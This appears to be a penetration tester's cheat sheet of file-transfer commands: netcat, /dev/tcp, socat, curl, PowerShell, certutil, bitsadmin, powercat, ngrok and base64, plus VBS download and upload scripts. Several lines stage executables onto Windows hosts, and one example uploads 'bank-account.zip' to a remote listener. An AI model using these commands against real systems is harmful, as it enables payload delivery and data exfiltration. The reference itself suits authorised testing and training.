# File Transfer

||Sending|Receiving|
|-|-|-|
|SCP|`$ scp -T -rp ./local/file.txt user@host:/remote/file.txt`|`$ scp -T -rp user@host:/remote/file.txt ./local/file.txt`|
|Netcat|`$ nc -nv 10.10.1.58 4444 < file.txt`<br>`$ cat file.txt > /dev/tcp/10.10.1.58/4444`|`$ nc -nvlp 4444 > file.txt`|
|Socat|`$ socat TCP4:10.10.1.58:4444,fork file:file.txt`|`$ socat TCP4-LISTEN:4444 file:file.txt`|
|Socat|`$ socat OPENSLL:10.10.1.58:4443,verify=0 file:file.txt`|`$ socat OPENSSL-LISTEN:4443,cert=mycert.pem,fork,verify=0 file:file.txt`|
|HTTP|`$ curl -k -X POST -F filename=@file.txt http://10.10.1.58:8080`<br>`$ python3 -m http.server 8080`<br>`$ python3 -m uploadserver` (upload `http://10.10.1.58:8000/upload`)<br>`$ php -S 0.0.0.0:8080`<br>`$ ruby -run -e httpd . -p 8080`<br>`$ (New-Object Net.WebClient).UploadFile('http://10.10.1.58/file.txt', 'POST', 'C:\file.bin')`|`$ python3 simplehttpserver.py -p 8080`<br>`$ nc -nvlp 8080 > file.bin; vi file.bin`<br>`$ curl https://10.10.1.58:8080/file.txt -o file.txt`<br>`$ python -c "import urllib2; print(urllib2.urlopen('http://10.10.1.58:8080/file.txt').read())"`|
|HTTP (over internet)|`$ python3 -m http.server 8080 &; ngrok 8080`|`$ curl https://fdi7fs7dfds.ngrok.io/file.txt -o file.txt`|
|FTP|`$ python3 -m pyftpdlib -p 21 -w`|`$ ftp -v -n -s:commands.txt`<br>`$ curl 'ftp://10.10.1.58/file.txt'`<br>`$ (New-Object System.Net.WebClient).DownloadFile( 'ftp://192.168.43.128:21/nmap.txt', '.\nmap.txt')`|
|SMB|`$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py foo ./`|`$ smbclient //10.10.1.58/FOO`|
|PowerShell|`$ powershell -c "(New-Object System.Net.WebClient).UploadFile( 'http://10.10.1.58:8080/file.txt', '.\file.txt')"`|`$ powershell -c "(New-Object System.Net.WebClient).DownloadFile( 'http://10.10.1.58:8080/file.txt', '.\file.txt')"`|
|CMD|`?`|`$ certutil -urlcache -split -f http://10.10.1.58/file.txt file.txt`<br>`$ bitsadmin /transfert "mejob" http://10.10.1.58:8080/file.txt C:\file.txt`|
|[Powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)|`$ powercat -c 10.10.1.58 -p 8080 -i file.txt`|`$ powercat -l -p 8080 -o Bytes -of file.txt`|
|Clipboard|`$ base64 -w 0 file.txt`<br>`$ xxd -p file.txt \| tr -d "\n"`|`$ echo -n "..." \| base64 -d > file.txt`<br>`$ [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")) > file.txt`<br>`$ echo -n "..." \| xxd -p -r > file.txt`|

## VBS

### Download.vbs
```vb
Set objArgs = Wscript.Arguments
strFileURL = objArgs(0)
strHDLocation = objArgs(1)
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "GET", strFileURL, false
objXMLHTTP.send()
If objXMLHTTP.Status = 200 Then
Set objADOStream = CreateObject("ADODB.Stream")
objADOStream.Open
objADOStream.Type = 1 'adTypeBinary
objADOStream.Write objXMLHTTP.ResponseBody
objADOStream.Position = 0
Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
Set objFSO = Nothing
objADOStream.SaveToFile strHDLocation
objADOStream.Close
Set objADOStream = Nothing
End if
Set objXMLHTTP = Nothing
```
```sh
C:\> cscript.exe download.vbs "http://10.11.1.1/something.exe" "C:\something.exe"
```

### Upload.vbs
```vb
Set objArgs = WScript.Arguments
Set HTTP = CreateObject("Microsoft.XMLHTTP")
Set objStream = CreateObject("ADODB.Stream")
objStream.Open
objStream.Type = 1
objStream.LoadFromFile objArgs(0)
Set dom = CreateObject("Microsoft.XMLDOM")
Set elem = dom.createElement("tmp")
elem.dataType = "bin.base64"
elem.nodeTypedValue = objStream.Read
HTTP.open "PUT", objArgs(1), False
HTTP.setRequestHeader "Content-Type", "application/octet-stream"
HTTP.send elem.text
Set dom = Nothing
Set HTTP = Nothing
```
```sh
C:\> cscript upload.vbs "C:\bank-account.zip" "http://192.168.119.247:8080/"
```
